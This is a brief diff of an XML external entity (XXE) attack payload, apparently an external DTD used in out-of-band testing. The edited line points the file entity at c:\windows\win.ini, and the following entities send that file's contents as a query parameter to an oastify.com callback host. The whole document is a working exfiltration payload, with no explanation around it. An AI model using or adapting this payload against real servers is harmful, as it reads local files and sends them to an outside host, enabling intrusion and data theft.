@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "http://idr.production.elmae/health.aspx">
+<!ENTITY % file SYSTEM "file:///c:\windows\win.ini">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://ipb6mb87tplg9k4fy8fpyan66xco0eo3.oastify.com/exfil?xxe=%file;'>">
 %eval;
 %error;
